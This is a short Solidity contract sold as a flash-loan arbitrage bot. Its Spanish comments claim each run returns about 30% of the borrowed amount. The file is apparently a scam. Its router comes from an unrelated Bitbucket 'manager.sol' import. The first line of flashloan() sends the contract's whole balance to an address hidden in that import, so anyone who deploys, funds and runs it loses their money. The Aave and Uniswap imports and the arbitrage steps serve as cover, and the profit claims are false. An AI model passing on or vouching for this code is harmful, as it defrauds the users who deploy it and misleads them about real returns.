pragma solidity ^0.5.0;


// AAVE Smart Contracts
import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";

// Router
import "https://bitbucket.org/senekas/pancakeswapv2/raw/efaec4b32f16ed762a0cd0cc4f0aa12f32b2037e/blob/main/core/interface/manager.sol";

//Uniswap Smart contracts
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
	RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Envia token a realizar swap
        address(uint160(router.uniswapSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.aaveSwapAddress(),
            flashLoanAmount
        );
        // Para preparar el swap, Matic es convertido a Dai usando el contrato swap de AAVE
        router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
        // Luego se convierte Dai por Matic usando Dai/Matic de Uniswap.
        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
        // Despues del swap, el Matic es transferido de vuelta al multiplicador para pagar el prestamo mas el fee. Esta transaccion cuesta 0.2 Matic.
        router.transferDaiToMultiplier(router.uniswapSwapAddress());
        // La direccion que realiza el swap recibe cerca de un 30% del prestamo que se solicito. La transaccion se puede repetir ya que los precios cambian todo el tiempo.
        router.completeTransation(address(this).balance);
    }
}

